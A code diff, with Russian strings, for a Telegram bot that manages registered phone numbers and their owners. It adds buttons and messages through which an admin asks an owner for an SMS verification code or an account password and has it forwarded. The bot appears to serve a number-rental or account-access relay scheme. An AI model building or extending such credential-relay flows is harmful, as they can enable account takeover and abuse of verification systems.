@@ -251,6 +251,7 @@ _CANCEL_KB = InlineKeyboardMarkup(inline_keyboard=[[
 def active_inline() -> InlineKeyboardMarkup:
     """Панель управления активным номером (для админа)."""
     return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔢 Код",          callback_data="active:code")],
         [
             InlineKeyboardButton(text="✅ Встал",      callback_data="active:met"),
             InlineKeyboardButton(text="🔑 Пароль",    callback_data="active:password"),
@@ -382,17 +383,22 @@ def format_members_today() -> str:
     return "\n".join(lines)
 
 
+_STATUS_ICON = {"active": "⏳", "queued": "📥", "cooldown": "🕐", "banned": "🚫", "free": "🔐"}
+
+
 def owners_request_inline() -> InlineKeyboardMarkup | None:
     if not store.owners:
         return None
-    buttons = [
-        [InlineKeyboardButton(
-            text=f"🔐 {mask_phone(phone)} — {(o.name or str(o.user_id))[:20]}",
-            callback_data=f"req:{phone}",
-        )]
-        for o in store.owners.values()
-        for phone in o.phones
-    ]
+    buttons = []
+    for o in store.owners.values():
+        for phone in o.phones:
+            icon = _STATUS_ICON.get(store.phone_status(phone), "🔐")
+            buttons.append([InlineKeyboardButton(
+                text=f"{icon} {mask_phone(phone)} — {(o.name or str(o.user_id))[:20]}",
+                callback_data=f"req:{phone}",
+            )])
+    if not buttons:
+        return None
     buttons.append([InlineKeyboardButton(text="◀️ Назад", callback_data="menu:back")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -740,18 +746,31 @@ async def _notify_owner_request(bot: Bot, req: CodeRequest) -> bool:
         return False
 
 
-async def _request_password_from_owner(bot: Bot, req: CodeRequest, attempt: int) -> None:
-    """Запрашивает у владельца код/пароль (вызывается по кнопке «Пароль»/«Повтор»)."""
+async def _request_from_owner(
+    bot: Bot, req: CodeRequest, attempt: int, kind: str = "code"
+) -> None:
+    """Запрашивает у владельца SMS-код или пароль.
+    kind='code'  → запрос SMS-кода
+    kind='password' → запрос пароля аккаунта
+    """
+    if kind == "code":
+        text = (
+            f"🔢 *Нужен SMS-код для номера* `{req.phone}`\n"
+            f"Попытка *{attempt}/2* · отправьте *{CODE_LEN} цифр*."
+        )
+    else:
+        text = (
+            f"🔑 *Нужен пароль для номера* `{req.phone}`\n"
+            f"Попытка *{attempt}/2* · отправьте пароль."
+        )
     try:
         await bot.send_message(
-            req.owner_id,
-            f"🔑 *Нужен пароль/код для номера* `{req.phone}`\n"
-            f"Попытка *{attempt}/2* · отправьте *{CODE_LEN} цифр*.",
+            req.owner_id, text,
             parse_mode="Markdown",
             reply_markup=owner_code_request_inline(),
         )
     except Exception:
-        log.warning("Не удалось запросить пароль у владельца %s", req.owner_id)
+        log.warning("Не удалось запросить у владельца %s", req.owner_id)
 
 
 async def _forward_code_to_admin(bot: Bot, req: CodeRequest, code: str) -> None:
@@ -1080,16 +1099,18 @@ async def cb_active(callback: CallbackQuery, bot: Bot) -> None:
                 pass
         await _finish_active(bot, reason="met")
 
-    elif action == "password":
+    elif action in ("code", "password"):
         global _password_mode, _password_attempts
         _password_mode     = True
         _password_attempts = 1  # 1 Повтор = 2 попытки суммарно
-        await callback.answer("🔑 Запрос пароля отправлен")
-        await _request_password_from_owner(bot, req, attempt=1)
+        kind  = action  # "code" или "password"
+        label = "🔢 SMS-код" if kind == "code" else "🔑 Пароль"
+        await callback.answer(f"{label} — запрос отправлен")
+        await _request_from_owner(bot, req, attempt=1, kind=kind)
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
-                    f"📱 *{mask_phone(req.phone)}*\n🔑 Запрос пароля отправлен владельцу...",
+                    f"📱 *{mask_phone(req.phone)}*\n{label} запрошен у владельца...",
                     parse_mode="Markdown", reply_markup=password_inline(),
                 )
             except Exception:
@@ -1138,7 +1159,6 @@ async def cb_password(callback: CallbackQuery, bot: Bot) -> None:
     elif action == "repeat":
         global _password_mode, _password_attempts
         if _password_attempts <= 0:
-            # Попытки исчерпаны — авто-скип
             await callback.answer("⚠️ Попытки исчерпаны — скип", show_alert=True)
             if isinstance(msg, Message):
                 try:
@@ -1148,11 +1168,11 @@ async def cb_password(callback: CallbackQuery, bot: Bot) -> None:
             await _finish_active(bot, reason="skip")
             return
         await callback.answer("🔄 Повторный запрос отправлен")
-        await _request_password_from_owner(bot, req, attempt=2)
+        await _request_from_owner(bot, req, attempt=2, kind="code")
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
-                    f"📱 *{mask_phone(req.phone)}*\n🔑 Повторный запрос пароля отправлен...",
+                    f"📱 *{mask_phone(req.phone)}*\n🔄 Повторный запрос отправлен...",
                     parse_mode="Markdown", reply_markup=password_inline(),
                 )
             except Exception:
@@ -1340,7 +1360,12 @@ async def cb_req_type(callback: CallbackQuery, bot: Bot) -> None:
     msg    = callback.message
 
     if action == "sms":
-        await _queue_all_phones(bot, uid, msg)
+        kb = owners_request_inline()
+        if not kb:
+            await _edit_or_answer(msg, "Нет зарегистрированных номеров.",
+                                  reply_markup=request_inline())
+            return
+        await _edit_or_answer(msg, format_owners_list(), parse_mode="Markdown", reply_markup=kb)
     elif action == "qr":
         await _edit_or_answer(msg, "📷 *QR-режим*\n\nФункция в разработке.",
                               parse_mode="Markdown", reply_markup=request_inline())
